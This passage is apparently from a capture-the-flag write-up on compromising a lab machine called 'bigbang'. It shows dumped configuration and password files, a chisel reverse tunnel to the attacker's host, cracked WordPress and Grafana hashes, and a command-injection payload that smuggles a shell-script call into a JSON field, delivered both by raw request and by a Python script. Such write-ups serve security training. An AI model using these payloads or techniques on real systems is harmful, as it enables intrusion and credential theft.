define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wp_password' );

/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

```
And the /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```
And the /etc/hosts
```
www-data@bf9a078a3627:/var/www/html/wordpress$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      bf9a078a3627
```

There is a terrible fact here, the docker machine does not have mysql or sqlite3, so we have to port forwording to our local machine to check the database.
In this place, I would use `chisel` to finish them
```
In our local machine 
./chisel server -p 9001 --reverse

In the target machine 
./chisel client 10.10.16.9:9001 R:13306:172.17.0.1:3306

Let 172.17.0.1:3306 forward to our local machine, and check the database.
mysql -h 127.0.0.1 -P 13306 -u wp_user -p
```

Then we finally get the database 
```
MySQL [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url                | user_registered     | user_activation_key | user_status | display_name    |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
|  1 | root       | $P$Beh5HLRUlTi1LpLEAstRyXaaBOJICj1 | root          | root@bigbang.htb     | http://blog.bigbang.htb | 2024-05-31 13:06:58 |                     |           0 | root            |
|  3 | shawking   | $P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./ | shawking      | shawking@bigbang.htb |                         | 2024-06-01 10:39:55 |                     |           0 | Stephen Hawking |
+----+------------+------------------------------------+---------------+----------------------+-------------------------+---------------------+---------------------+-------------+-----------------+
2 rows in set (0.027 sec)

```
Then we can crack the password of `shawking` 
(It would be a long time to crack the password, in my local machine, I take 30 mins to get the result)
`$P$Br7LUHG9NjNk6/QSYm2chNHfxWdoK./:quantumphysics`

Then we can use ssh to connect it.

3, shell as root
Firstly, I would continue to check the right as root and net state
```
sudo -l
[sudo] password for shawking: 
Sorry, user shawking may not run sudo on bigbang.

shawking@bigbang:~$ netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:36733         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.17.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```
By using curl to check them, port 9090 and 3000 seems like our target here.
```
shawking@bigbang:~$ curl 127.0.0.1:9090
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
shawking@bigbang:~$ curl 127.0.0.1:3000
<a href="/login">Found</a>.

/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3000 -container-ip 172.17.0.2 -container-port 3000 
```
Let's continue to port forward to our local machine and check what is going on for this port.

By using `linpeas.sh`, I found a data file `grafana.db` from `/opt/data` 
Then by downloading to local machine and use sqlite3 to check it ,we get the data
```
1|0|admin|admin@localhost||441a715bd788e928170be7954b17cb19de835a2dedfdece8c65327cb1d9ba6bd47d70edb7421b05d9706ba6147cb71973a34|CFn7zMsQpf|CgJll8Bmss||1|1|0||2024-06-05 16:14:51|2024-06-05 16:16:02|0|2024-06-05 16:16:02|0|0|
2|0|developer|ghubble@bigbang.htb|George Hubble|7e8018a4210efbaeb12f0115580a476fe8f98a4f9bada2720e652654860c59db93577b12201c0151256375d6f883f1b8d960|4umebBJucv|0Whk1JNfa3||1|0|0||2024-06-05 16:17:32|2025-01-20 16:27:39|0|2025-01-20 16:27:19|0|0|ednvnl5nqhse8d
```
We can use `grafana2hashcat` to help us crack the password
`https://github.com/iamaldi/grafana2hashcat.git`

Then we get the password of `George`
`sha256:10000:NHVtZWJCSnVjdg==:foAYpCEO+66xLwEVWApHb+j5ik+braJyDmUmVIYMWduTV3sSIBwBUSVjddb4g/G42WA=:bigbang`

For port 3000, I found the service Grafana v11.0.0
![](images/Pasted%20image%2020250130232913.png)
And also I found the exploit script here
`Grafana RCE exploit (CVE-2024-9264)`
`https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git`
But sadly after running the exploit script, nothing happened, I guess that's because authenticated Grafana user `developer` do not have Viewer permissions or higher.
Maybe user `admin` would successfully exploit it.(But I can not crack the hash of admin)
So I guess it's a rabbit hole here.

Then we can su developer with this password, and there is `satellite-app.apk` file in the `/home/developer/android` directory.
By using jadx-gui  to decompile java code, we can find the function`login` and `command`
![](images/Pasted%20image%2020250130232154.png)
![](images/Pasted%20image%2020250130232530.png)
By reading the source code, we can find there is command injection from function `command`

We have known the service is `satellite-app.apk`, and we can not login by get Method
![](images/Pasted%20image%2020250130021231.png)
But we can use the Post method to login.
![](images/Pasted%20image%2020250130021447.png)
So let's exploit it with POST method:

I used Burp with Proxy > Intercept. Open the browser and go to http://127.0.0.1:9090/login
```
POST /login HTTP/1.1
Host: 127.0.0.1:9090
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
content-type: application/json
Content-Length: 57

{
"username":"developer",
"password":"bigbang"
}

```
Forward it. You should get an access_token back.
![](images/Pasted%20image%2020250130224318.png)

After that go to http://127.0.0.1:9090/command in the Burp browser and edit the intercepted request again:
```
POST /command HTTP/1.1
Host: 127.0.0.1:9090
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="123", "Not:A-Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 67
Authorization: Bearer 
<Your previously received access_token>


{"command": "send_image", "output_file": "\n/bin/bash /tmp/rev.sh"}
```

We can take it into the script and exploit it.
```
import requests
import re
import getpass

#  enter the password
username = "developer"
password = getpass.getpass("Enter password: ")

#  login credentials
login_payload = {
    "username": username,
    "password": password
}

# Perform login and capture the response
login_response = requests.post("http://127.0.0.1:9090/login", json=login_payload)
access_token = login_response.json().get("access_token")

if access_token:
    # Define the command payload
    command_payload = {
        "command": "send_image",
        "output_file": "maggi.png\nbash /tmp/shell.sh"
    }

    # Use the access token to authorize and send the command
    command_response = requests.post(
        "http://127.0.0.1:9090/command",
        headers={
            "Authorization": f"Bearer {access_token}",
            "Content-Type": "application/json"
        },
        json=command_payload
    )

    # Print the response for debugging
    print(command_response.text)
else:
    print("Failed to retrieve access token")
```